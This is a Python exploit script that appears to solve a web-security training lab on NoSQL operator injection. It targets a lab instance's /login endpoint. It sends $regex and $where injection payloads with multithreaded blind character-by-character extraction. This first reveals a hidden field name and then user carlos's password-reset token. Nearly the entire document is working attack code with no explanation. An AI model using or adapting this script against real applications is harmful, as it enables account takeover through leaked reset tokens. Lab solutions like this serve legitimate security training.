# LAB: Exploiting NoSQL operator injection to extract unknown fields
import requests
from threading import Thread
import string
import re
import urllib.parse
import time

start_time = time.time()

# URL LAB ID
url = 'https://0a3d000503f6b401823bb0bb000d00e3.web-security-academy.net'

field_length = 10
token_length = 16

field_name = [''] * field_length
token = [''] * token_length

def find_field_name(i):
  for char in string.printable:
      data = {"username":"carlos","password":{"$regex":".*"},"$where":f"Object.keys(this)[4][{i}] == '{char}'"}
      
      response = requests.post(url + '/login', json=data)
      if "Account locked: please reset your password" in response.text:
        field_name[i] = char
        break

def find_reset_token(field_name, i):
  for char in string.ascii_letters + string.digits:
      data = {"username":"carlos","password":{"$regex":".*"},f"{field_name}":{"$regex":f"^.{{{i}}}{char}.{{{15-i}}}$"}}
      response = requests.post(url + '/login', json=data)
      if "Account locked: please reset your password" in response.text:
        token[i] = char
        break

# Spawn thread to find field name character
threads = []
for i in range(field_length):
  threads.append(Thread(target=find_field_name, args=(i,)))
  threads[i].start()
  
for i in range(field_length):
  threads[i].join()

print(f'Token Field name: {"".join(field_name)}')
# Spawn thread to find carlos token value
threads = []
for i in range(token_length):
  threads.append(Thread(target=find_reset_token, args=(''.join(field_name),i,)))
  threads[i].start()
  
for i in range(token_length):
  threads[i].join()
print(f'Carlos reset token: {"".join(token)}')
print('------------------------------------------- \nExecution Time: %s seconds' % (time.time() - start_time))